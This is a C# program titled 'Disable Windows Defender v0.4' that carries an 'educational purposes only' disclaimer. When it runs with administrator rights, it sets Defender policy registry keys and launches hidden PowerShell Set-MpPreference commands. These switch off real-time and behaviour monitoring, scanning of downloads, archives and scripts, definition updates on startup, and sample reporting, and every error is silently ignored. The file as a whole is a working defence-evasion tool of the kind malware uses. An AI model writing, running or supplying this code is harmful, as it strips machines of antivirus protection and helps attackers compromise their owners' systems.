using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Security.Principal;
using System.Threading;

//       │ Author     : NYAN CAT
//       │ Name       : Disable Windows Defender v0.4
//       │ Contact    : https://github.com/NYAN-x-CAT

//       This program is distributed for educational purposes only. 

namespace Disable_Windows_Defender
{
    class Program
    {
        static void Main()
        {

            if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator)) return;

            RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender", "DisableAntiSpyware", "1");
            RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableBehaviorMonitoring","1");
            RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableOnAccessProtection", "1");
            RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableScanOnRealtimeEnable", "1");

            Thread.Sleep(100);

            RunPS("Set-MpPreference -DisableRealtimeMonitoring $true"); //real-time protection
            RunPS("Set-MpPreference -DisableBehaviorMonitoring $true"); //behavior monitoring
            RunPS("Set-MpPreference -DisableBlockAtFirstSeen $true");
            RunPS("Set-MpPreference -DisableIOAVProtection $true"); //scans all downloaded files and attachments
            RunPS("Set-MpPreference -DisablePrivacyMode $true"); //displaying threat history
            RunPS("Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true"); //definition updates on startup
            RunPS("Set-MpPreference -DisableArchiveScanning $true"); //scan archive files, such as .zip and .cab files
            RunPS("Set-MpPreference -DisableScriptScanning $true"); //scanning of scripts during scans
            RunPS("Set-MpPreference -SubmitSamplesConsent Never"); //MAPSReporting 
            RunPS("Set-MpPreference -MAPSReporting 0"); //MAPSReporting 
        }

        private static void RegistryEdit(string regPath, string name, string value)
        {
            try
            {
                using (RegistryKey key = Registry.LocalMachine.OpenSubKey(regPath,RegistryKeyPermissionCheck.ReadWriteSubTree))
                {
                    if (key == null)
                    {
                        Registry.LocalMachine.CreateSubKey(regPath).SetValue(name, value, RegistryValueKind.DWord);
                        return;
                    }
                    if (key.GetValue(name) != (object)value)
                        key.SetValue(name, value, RegistryValueKind.DWord);
                }
            }
            catch { }
        }

        private static void RunPS(string args)
        {
            try
            {
                ProcessStartInfo ps = new ProcessStartInfo();
                ps.FileName = "powershell.exe";
                ps.Arguments = args;
                ps.WindowStyle = ProcessWindowStyle.Hidden;
                Process process = new Process();
                process.StartInfo = ps;
                process.Start();
            }
            catch { }
        }
    }
}
